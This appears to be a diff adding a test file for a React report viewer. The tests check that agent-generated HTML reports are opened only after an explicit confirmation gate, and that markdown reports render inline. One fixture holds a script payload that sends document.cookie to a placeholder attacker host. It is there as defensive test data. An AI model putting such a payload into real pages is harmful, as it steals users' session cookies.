@@ -1,0 +1,256 @@
+import assert from 'node:assert/strict'
+import { readFileSync } from 'node:fs'
+import { join } from 'node:path'
+
+import { renderToStaticMarkup } from 'react-dom/server'
+
+import {
+  ReportPathPicker,
+  ReportViewBody,
+  isHtmlReport,
+  loadReportContent,
+  type ReportFilesystem,
+  type ReportViewState,
+} from './AutomationReportViewer'
+
+let failures = 0
+const pending: Array<Promise<void>> = []
+function run(name: string, fn: () => void | Promise<void>): void {
+  pending.push(
+    Promise.resolve()
+      .then(fn)
+      .then(
+        () => console.log(`ok - ${name}`),
+        (error) => {
+          failures += 1
+          console.error(`not ok - ${name}`)
+          console.error(error)
+        },
+      ),
+  )
+}
+
+const WORKSPACE = '/repo'
+
+// A recording stub for the two filesystem calls the viewer makes. Each call is
+// logged so a test can assert both the path resolution and that the wrong
+// branch was never taken (e.g. an html report must not read inline).
+function stubFs(overrides: Partial<ReportFilesystem> = {}): {
+  fs: ReportFilesystem
+  reads: string[]
+  opens: string[]
+} {
+  const reads: string[] = []
+  const opens: string[] = []
+  const fs: ReportFilesystem = {
+    readfile: async (path) => {
+      reads.push(path)
+      throw new Error('not stubbed')
+    },
+    openHtmlFileInBrowser: async (path) => {
+      opens.push(path)
+    },
+    ...overrides,
+  }
+  return { fs, reads, opens }
+}
+
+// ---- loadReportContent: the read/open branches (stubbed filesystem) ---------
+
+run('a .md report reads <workspaceRoot>/<path> and renders as markdown', async () => {
+  const { fs, reads, opens } = stubFs({
+    readfile: async (path) => {
+      reads.push(path)
+      return '# Findings\n\nAll clear.'
+    },
+  })
+  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.md')
+  assert.deepEqual(reads, ['/repo/reports/run-1.md'], 'reads the path resolved under the workspace root')
+  assert.equal(opens.length, 0, 'a markdown report never opens the browser')
+  assert.equal(state.kind, 'markdown')
+  assert.equal(state.kind === 'markdown' && state.markdown, '# Findings\n\nAll clear.')
+})
+
+run('a readfile rejection (missing/un-merged file) yields the not-found state', async () => {
+  const { fs } = stubFs({
+    readfile: async () => {
+      throw new Error('ENOENT')
+    },
+  })
+  const state = await loadReportContent(fs, WORKSPACE, 'reports/missing.md')
+  assert.equal(state.kind, 'not-found')
+})
+
+run('an existing .html report probes the path and resolves to the confirm gate without opening', async () => {
+  const { fs, reads, opens } = stubFs({
+    readfile: async (path) => {
+      reads.push(path)
+      return "<script>fetch('//attacker/'+document.cookie)</script>"
+    },
+  })
+  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
+  assert.deepEqual(reads, ['/repo/reports/run-1.html'], 'probes the resolved path for existence')
+  assert.equal(opens.length, 0, 'loading an html report never opens the browser — opening is gated behind confirm')
+  assert.equal(state.kind, 'html-confirm')
+})
+
+run('an un-merged .html report (existence probe rejects) reaches not-found, never a false opened state', async () => {
+  const { fs, opens } = stubFs({
+    readfile: async () => {
+      throw new Error('ENOENT')
+    },
+  })
+  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
+  assert.equal(state.kind, 'not-found')
+  assert.equal(opens.length, 0, 'an un-merged html report is never handed to the browser')
+})
+
+run('isHtmlReport distinguishes .html from .md (case-insensitive)', () => {
+  assert.equal(isHtmlReport('reports/a.html'), true)
+  assert.equal(isHtmlReport('reports/a.HTML'), true)
+  assert.equal(isHtmlReport('reports/a.md'), false)
+})
+
+// ---- ReportViewBody: each terminal state renders correctly ------------------
+
+function body(state: ReportViewState, pullRequestUrl?: string): string {
+  return renderToStaticMarkup(
+    <ReportViewBody state={state} pullRequestUrl={pullRequestUrl} onOpenHtml={() => {}} />,
+  )
+}
+
+run('the markdown state renders the report content via renderMarkdown', () => {
+  const markup = body({ kind: 'markdown', markdown: '# Security findings\n\nNo issues.' })
+  assert.match(markup, /markdown-rendered/, 'content goes through the shared markdown renderer')
+  assert.match(markup, /Security findings/, 'the heading text renders')
+  assert.match(markup, /No issues\./, 'the body text renders')
+})
+
+run('the not-found state shows the merge message and the Pull request link when present', () => {
+  const markup = body({ kind: 'not-found' }, 'https://github.com/o/r/pull/7')
+  assert.match(markup, /hasn’t been merged yet/, 'the not-found copy is shown')
+  assert.match(markup, /href="https:\/\/github\.com\/o\/r\/pull\/7"/, 'the PR link points at the run PR')
+  assert.match(markup, /Pull request/, 'the link is labelled')
+})
+
+run('the not-found state without a PR renders no dead link', () => {
+  const markup = body({ kind: 'not-found' })
+  assert.match(markup, /hasn’t been merged yet/, 'the message still shows')
+  assert.ok(!markup.includes('<a '), 'no anchor without a pullRequestUrl')
+})
+
+run('the html-confirm gate warns it can run code and offers an explicit Open anyway, not inline content', () => {
+  const markup = body({ kind: 'html-confirm' })
+  assert.match(markup, /can run code/, 'the run-code risk is stated before opening')
+  assert.match(markup, /automation agent/, 'ownership of the html is attributed to the agent')
+  assert.match(markup, /Open anyway/, 'opening is an explicit confirmation, not the default')
+  assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
+})
+
+run('the html-opened state reports the browser hand-off and offers Open again', () => {
+  const markup = body({ kind: 'html-opened' })
+  assert.match(markup, /opened in your browser/, 'the html hand-off is explained')
+  assert.match(markup, /Open again/, 'a re-open affordance is offered')
+  assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
+})
+
+run('the loading state shows a labelled spinner', () => {
+  const markup = body({ kind: 'loading' })
+  assert.match(markup, /Loading report/, 'the loading state is labelled')
+})
+
+// ---- ReportPathPicker: multi-report switching -------------------------------
+
+run('the picker lists every report and marks the active one', () => {
+  const markup = renderToStaticMarkup(
+    <ReportPathPicker
+      paths={['reports/a.md', 'reports/b.html']}
+      activePath="reports/a.md"
+      onSelect={() => {}}
+    />,
+  )
+  assert.match(markup, />a\.md</, 'first report listed by basename')
+  assert.match(markup, />b\.html</, 'second report listed by basename')
+  // Exactly one button is pressed — the single accent lands on the active report.
+  const pressed = markup.match(/aria-pressed="true"/g) ?? []
+  assert.equal(pressed.length, 1, 'exactly one active report button')
+})
+
+run('clicking a picker tab selects that path', () => {
+  let picked: string | null = null
+  // Drive the click handler directly off the element tree the picker builds.
+  const tree = ReportPathPicker({
+    paths: ['reports/a.md', 'reports/b.html'],
+    activePath: 'reports/a.md',
+    onSelect: (path) => {
+      picked = path
+    },
+  })
+  const tabs = (tree.props.children as Array<{ props: { onClick: () => void } }>).filter(Boolean)
+  const second = tabs[1]
+  second.props.onClick()
+  assert.equal(picked, 'reports/b.html', 'selecting the second tab reports its path upward')
+})
+
+// ---- Component wiring the static render cannot reach ------------------------
+// The overlay's effect + dismissal are store/lifecycle-bound (the Drawer renders
+// null until its enter frames run), so assert them against the source the same
+// way the Backlog row tests assert panel wiring.
+const viewerSource = readFileSync(
+  join(process.cwd(), 'src/renderer/src/components/automations/AutomationReportViewer.tsx'),
+  'utf8',
+)
+
+run('the active report loads through loadReportContent in an effect keyed on the selection', () => {
+  assert.match(
+    viewerSource,
+    /useEffect\(\(\) => \{[\s\S]*loadReportContent\(window\.api, workspaceRoot, activePath\)[\s\S]*\}, \[activePath, workspaceRoot\]\)/,
+    'the load runs in an effect re-keyed on activePath, so picking a report loads it',
+  )
+})
+
+run('the picker selection is wired to setActivePath', () => {
+  assert.match(
+    viewerSource,
+    /<ReportPathPicker[^>]*onSelect=\{setActivePath\}/,
+    'choosing a report updates the active selection that the effect reloads on',
+  )
+})
+
+run('opening an html report is wired only through the confirm action, never the load effect', () => {
+  // The load effect must not open the browser (F1): openHtmlFileInBrowser is
+  // called solely from the openHtml confirm handler, which the body invokes via
+  // onOpenHtml. Assert the effect body holds no open call and the handler does.
+  const effect = viewerSource.match(/useEffect\(\(\) => \{[\s\S]*?\}, \[activePath, workspaceRoot\]\)/)
+  assert.ok(effect, 'the load effect exists')
+  assert.ok(
+    !effect![0].includes('openHtmlFileInBrowser'),
+    'the load effect never opens the browser — a single View-report click does not run agent html',
+  )
+  assert.match(
+    viewerSource,
+    /const openHtml = useCallback\(\(\) => \{[\s\S]*?openHtmlFileInBrowser\(joinFilePath\(workspaceRoot, activePath\)\)/,
+    'the only open call lives in the explicit openHtml confirm handler',
+  )
+  assert.match(
+    viewerSource,
+    /<ReportViewBody[^>]*onOpenHtml=\{openHtml\}/,
+    'the confirm gate and re-open both route through the gated openHtml handler',
+  )
+})
+
+run('the overlay delegates Esc / close / focus to the Drawer primitive via onClose', () => {
+  assert.match(
+    viewerSource,
+    /<Drawer open onClose=\{onClose\}/,
+    'rendered inside Drawer, which owns Escape, backdrop close, focus capture and restoration',
+  )
+})
+
+void Promise.all(pending).then(() => {
+  if (failures > 0) {
+    console.error(`AutomationReportViewer.test.tsx: ${failures} failing`)
+    process.exit(1)
+  }
+  console.log('AutomationReportViewer.test.tsx: ok')
+})
